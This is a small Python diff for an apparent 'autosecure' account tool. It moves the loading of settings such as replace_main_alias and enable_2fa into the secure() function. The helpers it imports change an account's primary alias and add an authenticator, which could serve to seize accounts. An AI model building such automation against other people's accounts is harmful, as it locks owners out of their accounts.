@@ -1,3 +1,4 @@
+from cogs import config
 from securing.utils.security_information import security_information
 from securing.utils.change_primary_alias import change_primary_alias
 from securing.utils.add_authenticator import add_authenticator
@@ -27,14 +28,15 @@ import httpx
 import uuid
 import json
 
-config = json.load(open("config.json", "r+"))["autosecure"]
-replace_alias = config["replace_main_alias"]
-enable_2fa = config["enable_2fa"]
-
 database = DBConnection()
 
 async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     # Main file where all processes to securing the account occur
+
+    # To auto update if you edit the config via command
+    config = json.load(open("config.json", "r+"))["autosecure"]
+    replace_alias = config["replace_main_alias"]
+    enable_2fa = config["enable_2fa"]
     
     apicanary = await get_cookies(session) 
     
